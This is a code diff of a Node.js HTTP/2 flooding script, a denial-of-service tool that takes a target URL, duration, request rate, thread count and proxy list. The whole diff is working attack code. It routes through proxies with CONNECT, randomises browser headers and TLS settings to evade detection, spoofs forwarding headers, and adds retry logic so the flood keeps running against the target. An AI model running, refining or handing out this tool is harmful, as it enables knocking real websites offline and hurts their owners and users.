@@ -8,9 +8,15 @@ const fs = require("fs");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
-process.on('uncaughtException', () => {});
+process.on('uncaughtException', function (exception) {});
+
+if (process.argv.length < 7) {
+    console.log(`Usage: target time rate thread proxyfile`);
+    process.exit();
+}
 
 const headers = {};
+
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
@@ -36,7 +42,7 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]) * 4,
+    Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
@@ -45,21 +51,35 @@ const sig = [
     'ecdsa_secp256r1_sha256',
     'rsa_pkcs1_sha384',
     'rsa_pkcs1_sha512',
-    'ecdsa_secp384r1_sha384'
+    'hmac_sha256',
+    'ecdsa_secp384r1_sha384',
+    'rsa_pkcs1_sha1',
+    'hmac_sha1'
 ];
 
 const accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'application/json',
+    '*/*',
+    'image/*',
+    'image/webp,image/apng',
     'text/html',
-    'application/xml'
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'application/json',
+    'application/xml',
+    'application/pdf',
+    'text/css',
+    'application/javascript'
 ];
 
 const lang_header = [
+    'ko-KR',
     'en-US',
     'zh-CN',
+    'zh-TW',
+    'en-ZA',
     'fr-FR',
     'ja-JP',
+    'ar-EG',
     'de-DE',
     'es-ES'
 ];
@@ -67,20 +87,28 @@ const lang_header = [
 const encoding_header = [
     'gzip, deflate, br',
     'deflate',
-    'gzip',
+    'gzip, deflate, lzma, sdch',
+    'deflate',
+    'identity',
+    'compress',
     'br'
 ];
 
 const version = [
-    '"Google Chrome";v="117", "Chromium";v="117", ";Not A Brand";v="99"',
-    '"Not.A/Brand";v="8", "Chromium";v="118", "Google Chrome";v="118"',
-    '"Microsoft Edge";v="117", "Chrome";v="117", "Microsoft Edge";v="117"'
+    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
+    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+    '"Mozilla Firefox";v="91", ";Not A Brand";v="99"',
+    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"',
+    '"Opera";v="79.0.4143.22", "Chrome";v="92.0.4515.115", "Opera";v="79.0.4143.22"',
+    '"Microsoft Edge";v="92.0.902.62", "Chrome";v="92.0.4515.131", "Microsoft Edge";v="92.0.902.62"'
 ];
 
 const rateHeaders = [
-    { "x-forwarded-for": randstr(12) },
-    { "x-real-ip": randstr(12) },
-    { "via": randstr(12) }
+    { "akamai-origin-hop": randstr(12) },
+    { "proxy-client-ip": randstr(12) },
+    { "via": randstr(12) },
+    { "cluster-ip": randstr(12) },
+    { "user-agent": randstr(12) },
 ];
 
 const parsedTarget = url.parse(args.target);
@@ -90,27 +118,24 @@ if (cluster.isMaster) {
         cluster.fork();
     }
     console.clear();
-    console.log('\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m' + parsedTarget.host + '\x1b[0m');
-    console.log('\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m' + args.time + '\x1b[0m');
-    console.log('\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m' + args.threads + '\x1b[0m');
-    console.log('\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m' + args.Rate + '\x1b[0m');
-    setTimeout(() => process.exit(0), args.time * 1000);
+    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
+    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
+    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
+    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
 } else {
-    setTimeout(() => process.exit(0), args.time * 1000);
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 500);
 }
 
 class NetSocket {
     constructor() {}
 
     HTTP(options, callback) {
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-        const buffer = Buffer.from(payload);
-
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+        const buffer = new Buffer.from(payload);
         const connection = net.connect({
             host: options.host,
             port: options.port,
-            noDelay: true
+            noDelay: true,
         });
 
         connection.setTimeout(options.timeout * 10000);
@@ -123,7 +148,7 @@ class NetSocket {
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             const isAlive = response.includes("HTTP/1.1 200");
-            if (!isAlive) {
+            if (isAlive === false) {
                 connection.destroy();
                 return callback(undefined, "error: invalid response from proxy server");
             }
@@ -137,104 +162,134 @@ class NetSocket {
 
         connection.on("error", error => {
             connection.destroy();
-            return callback(undefined, `error: ${error}`);
+            return callback(undefined, "error: " + error);
         });
     }
 }
 
 const Socker = new NetSocket();
+
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(15) + "=" + randstr(10);
+headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
 headers[":scheme"] = "https";
-headers["sec-ch-ua"] = randomElement(version);
+headers["sec-ch-ua"] = version[Math.floor(Math.random() * version.length)];
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-ch-ua-mobile"] = "?0";
-headers["accept-encoding"] = randomElement(encoding_header);
-headers["accept-language"] = randomElement(lang_header);
-headers["accept"] = randomElement(accept_header);
+headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
+headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];
 headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-site"] = "same-origin";
 headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
-    const proxyAddr = randomElement(readLines(args.proxyFile));
+    const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
-        address: parsedTarget.host,
-        timeout: 10
+        address: parsedTarget.host + ":443",
+        timeout: 15,
     };
 
-    Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) {
-            connection?.destroy();
-            return;
-        }
-
-        const tlsOptions = {
-            secure: true,
-            ALPNProtocols: ['h2'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-            ecdhCurve: 'P-256:P-384',
-            host: parsedTarget.host,
-            servername: parsedTarget.host,
-            rejectUnauthorized: false,
-            socket: connection,
-            sigals: randomElement(sig)
-        };
-
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 60000);
-
-        const client = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 30000,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536,
-                enablePush: false
-            },
-            createConnection: () => tlsConn
-        });
-
-        client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
-                const dynHeaders = {
-                    ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-                };
-                for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders);
-                    request.on("response", () => {
-                        request.close();
-                        request.destroy();
-                    });
-                    request.on("error", () => {
-                        request.close();
-                        request.destroy();
-                    });
-                    request.end();
+    function attemptConnection(retryCount = 0, maxRetries = 3) {
+        Socker.HTTP(proxyOptions, (connection, error) => {
+            if (error) {
+                if (retryCount < maxRetries) {
+                    setTimeout(() => attemptConnection(retryCount + 1, maxRetries), 1000);
                 }
-            }, 50);
-            client.on("close", () => clearInterval(IntervalAttack));
-        });
+                return;
+            }
 
-        client.on("error", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection?.destroy();
-        });
+            const tlsOptions = (() => {
+                const useTlsOption2 = (Math.random() < 0.5);
+                return useTlsOption2 ? {
+                    secure: true,
+                    ALPNProtocols: ['h2'],
+                    sigals: sig[Math.floor(Math.random() * sig.length)],
+                    socket: connection,
+                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                    ecdhCurve: 'P-256:P-384',
+                    host: parsedTarget.host,
+                    servername: parsedTarget.host,
+                    rejectUnauthorized: false,
+                } : {
+                    secure: true,
+                    ALPNProtocols: ['h2'],
+                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                    ecdhCurve: 'auto',
+                    rejectUnauthorized: false,
+                    servername: parsedTarget.host,
+                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
+                        crypto.constants.SSL_OP_NO_TICKET |
+                        crypto.constants.SSL_OP_NO_COMPRESSION |
+                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                        crypto.constants.SSL_OP_SINGLE_DH_USE |
+                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+                        crypto.constants.SSL_OP_NO_QUERY_MTU,
+                };
+            })();
 
-        client.on("close", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection?.destroy();
+            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+            tlsConn.setKeepAlive(true, 60000);
+
+            const client = http2.connect(parsedTarget.href, {
+                protocol: "https:",
+                settings: {
+                    headerTableSize: 65536,
+                    maxConcurrentStreams: 10000,
+                    initialWindowSize: 6291456,
+                    maxHeaderListSize: 65536,
+                    enablePush: false
+                },
+                createConnection: () => tlsConn,
+            });
+
+            client.on("connect", () => {
+                const IntervalAttack = setInterval(() => {
+                    const dynHeaders = {
+                        ...headers,
+                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+                    };
+                    for (let i = 0; i < args.Rate; i++) {
+                        const request = client.request(dynHeaders);
+                        request.on("response", response => {
+                            request.close();
+                        });
+                        request.on("error", () => {
+                            request.close();
+                        });
+                        request.end();
+                    }
+                }, 500);
+
+                setTimeout(() => clearInterval(IntervalAttack), (args.time * 1000) - 1000);
+            });
+
+            client.on("error", () => {
+                client.destroy();
+                if (retryCount < maxRetries) {
+                    setTimeout(() => attemptConnection(retryCount + 1, maxRetries), 1000);
+                }
+            });
+
+            tlsConn.on("error", () => {
+                tlsConn.destroy();
+                client.destroy();
+                if (retryCount < maxRetries) {
+                    setTimeout(() => attemptConnection(retryCount + 1, maxRetries), 1000);
+                }
+            });
         });
-    });
+    }
+
+    attemptConnection();
 }
+
+setTimeout(() => process.exit(1), args.time * 1000);
